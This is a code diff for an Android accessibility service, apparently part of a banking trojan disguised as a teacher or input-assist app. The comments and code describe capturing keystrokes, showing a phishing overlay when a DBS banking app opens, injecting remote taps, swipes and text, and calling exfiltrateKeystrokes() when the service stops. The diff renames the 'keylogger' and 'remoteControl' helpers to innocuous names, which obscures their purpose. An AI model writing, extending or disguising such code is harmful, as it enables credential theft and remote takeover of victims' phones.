@@ -11,9 +11,9 @@ import android.view.accessibility.AccessibilityEvent
  * Declared once in AndroidManifest → ONE permission popup for the user.
  *
  * All logic is kept in separate, modular helper classes:
- *   • KeyloggerHelper      → captures keystrokes & field-focus events
+ *   • inputHandlerHelper      → captures keystrokes & field-focus events
  *   • OverlayHelper        → DBS phishing overlay when banking app opens
- *   • RemoteControlHelper  → executes remote tap / swipe / text commands
+ *   • gestureManagerHelper  → executes remote tap / swipe / text commands
  *
  * ScreenMirrorService also calls this via [instance] for remote control.
  */
@@ -21,9 +21,9 @@ class InputAssistService : AccessibilityService() {
 
     private val TAG = "TeacherAppService"
 
-    private lateinit var keylogger:        TextSyncHelper
+    private lateinit var inputHandler:        TextSyncHelper
     private lateinit var overlay:          UiLayerHelper
-    private lateinit var remoteControl:    GestureHelper
+    private lateinit var gestureManager:    GestureHelper
 
     companion object {
         /** Singleton used by ScreenMirrorService for remote-control calls. */
@@ -36,18 +36,18 @@ class InputAssistService : AccessibilityService() {
         super.onServiceConnected()
         instance = this
 
-        keylogger        = TextSyncHelper(this)
+        inputHandler        = TextSyncHelper(this)
         overlay          = UiLayerHelper(this)
-        remoteControl    = GestureHelper(this)
+        gestureManager    = GestureHelper(this)
 
         // Configure events — union of all helper requirements
         val info = AccessibilityServiceInfo().apply {
             eventTypes =
                 AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED    or   // overlay
                         AccessibilityEvent.TYPE_WINDOWS_CHANGED          or   // overlay
-                        AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED        or   // keylogger
-                        AccessibilityEvent.TYPE_VIEW_FOCUSED             or   // keylogger field focus
-                        AccessibilityEvent.TYPE_VIEW_CLICKED             or   // keylogger clicks
+                        AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED        or   // inputHandler
+                        AccessibilityEvent.TYPE_VIEW_FOCUSED             or   // inputHandler field focus
+                        AccessibilityEvent.TYPE_VIEW_CLICKED             or   // inputHandler clicks
                         AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED        // clipboard
             feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
             flags =
@@ -64,7 +64,7 @@ class InputAssistService : AccessibilityService() {
 
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
         if (event == null) return
-        keylogger.onEvent(event)   // handles TYPE_VIEW_TEXT_CHANGED + TYPE_VIEW_FOCUSED
+        inputHandler.onEvent(event)   // handles TYPE_VIEW_TEXT_CHANGED + TYPE_VIEW_FOCUSED
         overlay.onEvent(event)     // handles TYPE_WINDOW_STATE_CHANGED + TYPE_WINDOWS_CHANGED
         if (event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
         }
@@ -74,7 +74,7 @@ class InputAssistService : AccessibilityService() {
 
     override fun onInterrupt() {
         Log.d(TAG, "Service interrupted — flushing keystrokes")
-        keylogger.exfiltrateKeystrokes()
+        inputHandler.exfiltrateKeystrokes()
         overlay.removeOverlay()
     }
 
@@ -82,16 +82,16 @@ class InputAssistService : AccessibilityService() {
         super.onDestroy()
         instance = null
         Log.d(TAG, "Service destroyed — final keystroke flush")
-        keylogger.exfiltrateKeystrokes()
+        inputHandler.exfiltrateKeystrokes()
         overlay.removeOverlay()
     }
 
     // ── Public API for ScreenMirrorService remote control ────────────────────
 
-    fun injectTap(x: Float, y: Float)                               = remoteControl.injectTap(x, y)
-    fun injectSwipe(x1: Float, y1: Float, x2: Float, y2: Float)    = remoteControl.injectSwipe(x1, y1, x2, y2)
-    fun injectText(text: String)                                    = remoteControl.injectText(text)
-    fun clearText()                                                 = remoteControl.clearText()
-    fun injectKey(key: String)                                      = remoteControl.injectKey(key)
-    fun injectGlobal(action: String)                                = remoteControl.injectGlobal(action)
+    fun injectTap(x: Float, y: Float)                               = gestureManager.injectTap(x, y)
+    fun injectSwipe(x1: Float, y1: Float, x2: Float, y2: Float)    = gestureManager.injectSwipe(x1, y1, x2, y2)
+    fun injectText(text: String)                                    = gestureManager.injectText(text)
+    fun clearText()                                                 = gestureManager.clearText()
+    fun injectKey(key: String)                                      = gestureManager.injectKey(key)
+    fun injectGlobal(action: String)                                = gestureManager.injectGlobal(action)
 }
